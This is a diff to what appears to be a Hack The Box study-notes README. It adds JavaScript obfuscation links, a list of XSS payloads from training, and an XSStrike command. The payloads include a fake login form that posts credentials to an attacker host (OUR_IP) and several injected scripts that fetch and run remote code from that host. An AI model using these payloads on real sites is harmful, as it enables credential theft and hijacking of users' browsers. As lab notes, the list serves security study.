@@ -58,3 +58,29 @@ g4man@htb[/htb]$ cd webfuzz_api
 g4man@htb[/htb]$ pip3 install -r requirements.txt
 g4man@htb[/htb]$ python3 api_fuzzer.py http://IP:PORT
 ```
+
+## Javascript Deofuscation
+
+To ofuscate js use: https://obfuscator.io  
+To deofuscate js use: https://matthewfl.com/unPacker.html
+
+## Cross-site scripting XSS
+
+Payloads used during the training 
+``` 
+<script>alert(window.origin)</script>
+<img src="" onerror=alert(window.origin)>
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+<script src="http://OUR_IP/script.js"></script>
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+Automatic too;
+``` bash
+g4man@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
+```
